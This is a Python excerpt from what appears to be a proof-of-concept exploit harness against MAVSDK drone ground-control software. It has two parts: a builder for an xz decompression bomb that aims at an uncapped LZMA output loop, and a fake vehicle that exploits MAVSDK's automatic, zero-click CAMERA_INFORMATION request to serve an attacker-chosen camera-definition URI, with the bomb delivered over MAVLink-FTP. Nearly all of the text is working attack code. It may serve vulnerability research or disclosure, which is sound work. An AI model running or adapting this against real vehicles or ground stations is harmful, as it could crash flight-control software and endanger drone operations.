def build_bomb_xz(output_gib=1, chunk_mib=8, cache_path=None):
    """A .xz stream that decodes to `output_gib` GiB of zeros.

    Compressed with the streaming API so building it costs a few MB of RAM rather
    than a gigabyte. The ratio is ~1:6869 with preset 9|EXTREME, so 1 GiB of output
    is about 153 KB on the wire -- roughly 656 MAVLink-FTP messages.

    Note what this is NOT: an attempt to exhaust memory. A stream declaring a huge
    LZMA dictionary does not make liblzma allocate it (measured: 60-byte input
    declaring 1537 MiB decodes in 1.5 MiB of RSS). The unbounded resource here is
    the OUTPUT SIZE, because inflate_lzma.cpp's write loop has no ceiling.
    """
    if cache_path and os.path.exists(cache_path):
        with open(cache_path, "rb") as fh:
            blob = fh.read()
        ok("  reused cached bomb from %s (%s bytes) -- no rebuild"
           % (cache_path, format(len(blob), ",")))
        return blob

    comp = lzma.LZMACompressor(format=lzma.FORMAT_XZ,
                               preset=9 | lzma.PRESET_EXTREME)
    zeros = b"\x00" * (chunk_mib * 1024 * 1024)
    out = []
    total = output_gib * 1024 // chunk_mib      # number of chunks
    t0 = time.time()
    for i in range(total):
        piece = comp.compress(zeros)
        if piece:
            out.append(piece)
        # Progress matters here: compressing 2 GiB at preset 9|EXTREME takes ~90s,
        # and a silent terminal for that long looks like a hang. Do not start the
        # app until this finishes and the "waiting for the GCS" line appears.
        pct = (i + 1) * 100 // total
        if pct % 10 == 0 and (i + 1) * 100 % total < 100:
            observe("  building ... %3d%%  (%.0fs elapsed)" % (pct, time.time() - t0))
    out.append(comp.flush())
    blob = b"".join(out)
    ok("  build done in %.0fs" % (time.time() - t0))
    if cache_path:
        try:
            tmp = cache_path + ".tmp"
            with open(tmp, "wb") as fh:
                fh.write(blob)
            os.replace(tmp, cache_path)
            observe("  cached to %s for future runs" % cache_path)
        except Exception as e:
            observe("  (could not cache: %s)" % e)
    return blob


class MavsdkCameraVehicle(FakeVehicle):
    """A vehicle that answers MAVSDK's own CAMERA_INFORMATION request.

    MAVSDK asks for CAMERA_INFORMATION on seeing a heartbeat from any component id
    it has not seen before (camera_impl.cpp:1008 -> :1028) -- there is no component
    filter, so the autopilot's own heartbeat is enough. The application never asks
    for anything, which is what makes this zero-click.
    """

    CAMINFO_ID = 259

    def __init__(self, *a, **kw):
        self.cam_uri = kw.pop("cam_uri", "")
        self.cam_model = kw.pop("cam_model", "MAVSDK03")
        self.cam_vendor = kw.pop("cam_vendor", "infected-drones")
        super().__init__(*a, **kw)
        self.answered = 0

    COUNT_FILE = "/work/ftp_count"

    def _note_ftp(self):
        """Readable progress without -v.

        With -v the harness prints 239 bytes of hex per FTP message, which makes
        the vehicle pane unwatchable on camera. This prints a summary line every
        250 chunks instead, and keeps the running total in a file so the watch
        pane can read one small number rather than grepping a growing log.
        """
        self.ftp_reqs = getattr(self, "ftp_reqs", 0) + 1
        self.ftp_bytes = getattr(self, "ftp_bytes", 0)
        try:
            tmp = self.COUNT_FILE + ".tmp"
            with open(tmp, "w") as fh:
                fh.write(str(self.ftp_reqs))
            os.replace(tmp, self.COUNT_FILE)     # atomic: readers never see a truncated file
        except Exception:
            pass
        if self.ftp_reqs % 250 == 0:
            attack("MAVFTP: served %d chunks (~%s bytes on the wire)"
                   % (self.ftp_reqs, format(self.ftp_reqs * 239, ",")))

    def _extra_rx_hook(self, msg, t):
        if t == "FILE_TRANSFER_PROTOCOL":
            self._note_ftp()
            return False          # let the base FTP server handle it
        if t not in ("COMMAND_LONG", "COMMAND_INT"):
            return False
        c = getattr(msg, "command", None)
        REQ = getattr(mavutil.mavlink, "MAV_CMD_REQUEST_MESSAGE", 512)
        REQ_CAMINFO = getattr(
            mavutil.mavlink, "MAV_CMD_REQUEST_CAMERA_INFORMATION", 522)
        want = int(getattr(msg, "param1", 0) or 0)

        # MAVSDK asks with BOTH the generic MAV_CMD_REQUEST_MESSAGE(259) and the
        # deprecated dedicated MAV_CMD_REQUEST_CAMERA_INFORMATION(522). Answering
        # only the first leaves it retrying forever, which is what an earlier
        # version of this harness did.
        wants_caminfo = (c == REQ_CAMINFO) or (c == REQ and want == self.CAMINFO_ID)
        if not wants_caminfo:
            if c == REQ and self.trace:
                observe("MAVSDK requested message id %d -- not camera info" % want)
            return False

        tgt = getattr(msg, "target_component", None)
        observe("MAVSDK requested CAMERA_INFORMATION via cmd=%s (target_component=%s)"
                % (c, tgt))
        observe("  the app never asked for this -- camera_impl.cpp:1028 did")
        self.master.mav.command_ack_send(c, mavutil.mavlink.MAV_RESULT_ACCEPTED)
        self.send_camera_information(
            vendor_name=self.cam_vendor.encode()[:32],
            model_name=self.cam_model.encode()[:32],
            cam_definition_uri=self.cam_uri.encode(),
            cam_definition_version=1)
        self.answered += 1
        attack("answered CAMERA_INFORMATION #%d cam_definition_uri=%r"
               % (self.answered, self.cam_uri))
        return True


